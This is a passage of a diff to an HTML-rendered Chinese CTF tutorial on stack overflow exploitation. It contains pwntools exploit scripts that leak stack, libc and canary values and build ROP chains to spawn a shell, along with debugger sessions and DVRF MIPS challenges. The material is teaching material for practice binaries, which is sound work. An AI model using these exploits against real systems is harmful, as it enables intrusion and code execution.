+   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
    0x4006d6    mov    ecx, 0
    0x4006db    mov    edx, 2
 ─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
@@ -4861,7 +4956,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    f 1           400715
    f 2     7ff756de02b1 __libc_start_main+241
 Breakpoint *0x4006B9
-pwndbg&gt; stack 15
+pwndbg> stack 15
 00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 ... ↓
 0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
@@ -4869,8 +4964,8 @@ pwndbg&gt; stack 15
 0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
 0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
 0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
-pwndbg&gt; distance 0x7ffceaf111d0 0x7ffceaf11160
-0x7ffceaf111d0-&gt;0x7ffceaf11160 is -0x70 bytes (-0xe words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
+0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 </p>
 <p>比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 <code>sub_400676</code> 函数来 leak libc。 </p>
 <p>然后在下一次利用时就可以通过 rop 执行 <code>system("/bin/sh")</code> 或 <code>execve("/bin/sh", 0, 0)</code> 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 <code>execve("/bin/sh", 0, 0)</code> 的利用链, 这种方法更稳妥(<code>system("/bin/sh")</code> 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p>
@@ -4885,15 +4980,15 @@ io <span class="token operator">=</span> process<span class="token punctuation">
 elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./over.over"</span><span class="token punctuation">)</span>
 libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
 
-io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span>
 stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x70</span>
-success<span class="token punctuation">(</span><span class="token string">"stack -&gt; {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 
 <span class="token comment" spellcheck="true">#  DEBUG("b *0x4006B9\nc")</span>
-io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'11111111'</span><span class="token punctuation">,</span> <span class="token number">0x400793</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x400676</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'1'</span><span class="token punctuation">,</span> stack<span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'11111111'</span><span class="token punctuation">,</span> <span class="token number">0x400793</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x400676</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'1'</span><span class="token punctuation">,</span> stack<span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-success<span class="token punctuation">(</span><span class="token string">"libc.address -&gt; {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 pop_rdi_ret<span class="token operator">=</span><span class="token number">0x400793</span>
 <span class="token triple-quoted-string string">'''
@@ -4905,7 +5000,7 @@ pop_rdx_pop_rsi_ret<span class="token operator">=</span>libc<span class="token p
 
 payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'22222222'</span><span class="token punctuation">,</span> pop_rdi_ret<span class="token punctuation">,</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pop_rdx_pop_rsi_ret<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token operator">*</span><span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'2'</span><span class="token punctuation">,</span> stack <span class="token operator">-</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x4006be</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 
-io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>总的来说这种方法跟 stack pivot 差别并不是很大。</p>
@@ -4924,7 +5019,7 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
   while (1)
     __libc_message (2, "*** %s ***: %s terminated\n",
                     msg, __libc_argv[0] ?: "<unknown>");
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></unknown></code></pre>
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p>
 <h3 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h3><p>这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 jarvisoj 上有复现。</p>
 <h4 id="确定保护"><a href="#确定保护" class="headerlink" title="确定保护"></a>确定保护</h4><p>可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。</p>
@@ -4988,13 +5083,13 @@ Please overwrite the flag: 222222222
 Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
 38    ../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
 ─────────────────────────────────────[ code:i386:x86-64 ]────
-   0x7ffff7b7f920 &lt;__memset_chk_avx2+0&gt; cmp    rcx, rdx
-   0x7ffff7b7f923 &lt;__memset_chk_avx2+3&gt; jb     0x7ffff7b24110 &lt;__GI___chk_fail&gt;
+   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
+   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
    0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
- → 0x7ffff7b7f930 &lt;__memset_avx2+0&gt; vpxor  xmm0, xmm0, xmm0
-   0x7ffff7b7f934 &lt;__memset_avx2+4&gt; vmovd  xmm1, esi
-   0x7ffff7b7f938 &lt;__memset_avx2+8&gt; lea    rsi, [rdi+rdx*1]
-   0x7ffff7b7f93c &lt;__memset_avx2+12&gt; mov    rax, rdi
+ → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
+   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
+   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
+   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
 ───────────────────────────────────────────────────────────────────[ stack ]────
 ['0x7fffffffda38', 'l8']
 8
@@ -5034,9 +5129,9 @@ Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksma
 
 Breakpoint 1, 0x00000000004006d0 in ?? ()
  code:i386:x86-64 ]────
-     0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;
-     0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9
-     0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620
+     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
+     0x4006c6 <_IO_gets@plt+6> push   0x9
+     0x4006cb <_IO_gets@plt+11> jmp    0x400620
  →   0x4006d0                  sub    rsp, 0x8
      0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
      0x4006db                  xor    esi, esi
@@ -5044,7 +5139,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 ──────────────────────────────────────────────────────────────────[ stack ]────
 ['0x7fffffffdb78', 'l8']
 8
-0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax     ← $rsp
+0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax     ← $rsp
 0x00007fffffffdb80│+0x08: 0x0000000000000000
 0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
 0x00007fffffffdb90│+0x18: 0x0000000100000000
@@ -5054,10 +5149,10 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
 ──────────────────────────────────────────────────────────────[ trace ]────
 [#0] 0x4006d0 → sub rsp, 0x8
-[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out="">, fini=<optimized out="">, rtld_fini=<optimized out="">, stack_end=0x7fffffffdc48)
+[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
 ---Type <return> to continue, or q <return> to quit---
 [#2] 0x400717 → hlt 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></return></return></optimized></optimized></optimized></setbuf@plt></stdout></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。</p>
 <p>此外，根据汇编代码</p>
 <pre class="line-numbers language-asm"><code class="language-asm">.text:00000000004007E0                 push    rbp
@@ -5081,12 +5176,12 @@ What's your name?
 Breakpoint 2, 0x000000000040080e in ?? ()
 ──────────────────────────[ code:i386:x86-64 ]────
      0x400804                  xor    eax, eax
-     0x400806                  call   0x4006b0 &lt;__printf_chk@plt&gt;
+     0x400806                  call   0x4006b0 <__printf_chk@plt>
      0x40080b                  mov    rdi, rsp
- →   0x40080e                  call   0x4006c0 &lt;_IO_gets@plt&gt;
-   ↳    0x4006c0 &lt;_IO_gets@plt+0&gt; jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 &lt;_IO_gets@got.plt&gt;
-        0x4006c6 &lt;_IO_gets@plt+6&gt; push   0x9
-        0x4006cb &lt;_IO_gets@plt+11&gt; jmp    0x400620
+ →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
+   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
+        0x4006c6 <_IO_gets@plt+6> push   0x9
+        0x4006cb <_IO_gets@plt+11> jmp    0x400620
         0x4006d0                  sub    rsp, 0x8
 ──────────────────[ stack ]────
 ['0x7fffffffda40', 'l8']
@@ -5100,14 +5195,14 @@ Breakpoint 2, 0x000000000040080e in ?? ()
 0x00007fffffffda70│+0x30: 0x0000000000000000
 0x00007fffffffda78│+0x38: 0x0000000000000000
 ────────────────────────────────────────────[ trace ]────
-[#0] 0x40080e → call 0x4006c0 &lt;_IO_gets@plt&gt;
+[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
 ──────────────────────────────────────────────────────────
 gef➤  print $rsp
 $1 = (void *) 0x7fffffffda40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看出rsp的值为0x7fffffffda40，那么相对偏移为</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">0x00007fffffffdc58</span><span class="token operator">-</span><span class="token number">0x7fffffffda40</span>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">0x00007fffffffdc58</span><span class="token operator">-</span><span class="token number">0x7fffffffda40</span>
 <span class="token number">536</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> hex<span class="token punctuation">(</span><span class="token number">536</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span><span class="token number">536</span><span class="token punctuation">)</span>
 <span class="token string">'0x218'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><p>我们构造利用程序如下</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -5153,10 +5248,10 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
   setvbuf(stdin, 0LL, 2, 0LL);
   setvbuf(_bss_start, 0LL, 2, 0LL);
   *(_OWORD *)buf = 0uLL;
-  *(_OWORD *)&amp;buf[16] = 0uLL;
+  *(_OWORD *)&buf[16] = 0uLL;
   puts("Input your Name:");
   read(0, buf, 0x30uLL);                        // overflow
-  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&amp;buf[8], *(_QWORD *)&amp;buf[16], *(_QWORD *)&amp;buf[24]);
+  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
   read(0, buf, 0x60uLL);                        // overflow
   return 0LL;
 }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -5216,10 +5311,10 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
 Breakpoint *(0x557c8443a000+0xA08)
-pwndbg&gt; canary
+pwndbg> canary
 $1 = 0
 canary : 0xb3012605fc402a00
-pwndbg&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+pwndbg><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 ‘a’ * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 ‘\0’, 我们就恢复出程序的 canary 了</p>
 <h4 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h4><p>有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址</p>
 <pre class="line-numbers language-asm"><code class="language-asm">0x000055dc43694a1e in ?? ()
@@ -5263,7 +5358,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
 06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
-pwndbg&gt; x/10i (0x0A3E+0x55dc43694000) 
+pwndbg> x/10i (0x0A3E+0x55dc43694000) 
    0x55dc43694a3e:    push   rbp
    0x55dc43694a3f:    mov    rbp,rsp
    0x55dc43694a42:    lea    rdi,[rip+0xd7]        # 0x55dc43694b20
@@ -5320,7 +5415,7 @@ context<span class="token punctuation">.</span>terminal <span class="token opera
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。</p>
 <h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。</p>
-<pre class="line-numbers language-asm"><code class="language-asm">pwndbg&gt; stack 25
+<pre class="line-numbers language-asm"><code class="language-asm">pwndbg> stack 25
 00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
 01:0008│      0x7fffffffe3a0 ◂— 0x1
 02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
@@ -5551,9 +5646,9 @@ Strings information
 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
 0x0006cb70 <span class="token keyword">:</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>padding 的长度可以使用 pwntools 的 <strong>cyclic</strong> 来很方便的找到</p>
-<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg&gt; cyclic 200
+<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> cyclic 200
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
-pwndbg&gt; c
+pwndbg> c
 Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -5597,7 +5692,7 @@ Invalid address 0x62616164
 06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')
 07:001c│     0xfffef0b4 ◂— 0x6261616c ('laab')
 Program received signal SIGSEGV
-pwndbg&gt; cyclic -l 0x62616164
+pwndbg> cyclic -l 0x62616164
 112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>因此 padding 长度即为 112</p>
 <blockquote>
@@ -5686,7 +5781,7 @@ void sub_4007F0()
 {
   __int64 v0; // [xsp+10h] [xbp+10h]
 
-  read(0LL, &amp;v0, 512LL);
+  read(0LL, &v0, 512LL);
 }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
 <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段</p>
@@ -5810,9 +5905,9 @@ $ <span class="token function">sudo</span> <span class="token function">ln</span
 <pre class="line-numbers language-python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>即能 get flag<br><img src="/images/loading.gif" data-original="../images/CTF/20201028012455.png" alt=""></p>
 <h3 id="2-DVRF-stack-bof-02-c"><a href="#2-DVRF-stack-bof-02-c" class="headerlink" title="2 DVRF stack_bof_02.c"></a>2 DVRF stack_bof_02.c</h3><p>题目源码如下</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
 <span class="token comment" spellcheck="true">//Simple BoF by b1ack0wl for E1550</span>
 <span class="token comment" spellcheck="true">//Shellcode is Required</span>
@@ -5822,7 +5917,7 @@ $ <span class="token function">sudo</span> <span class="token function">ln</span
 <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"\0"</span><span class="token punctuation">;</span>
 
 <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: stack_bof_01 &lt;argument>\r\n-By b1ack0wl\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span> 
 
@@ -6036,7 +6131,7 @@ pay <span class="token operator">+=</span> p32<span class="token punctuation">(<
 pay <span class="token operator">+=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">24</span>
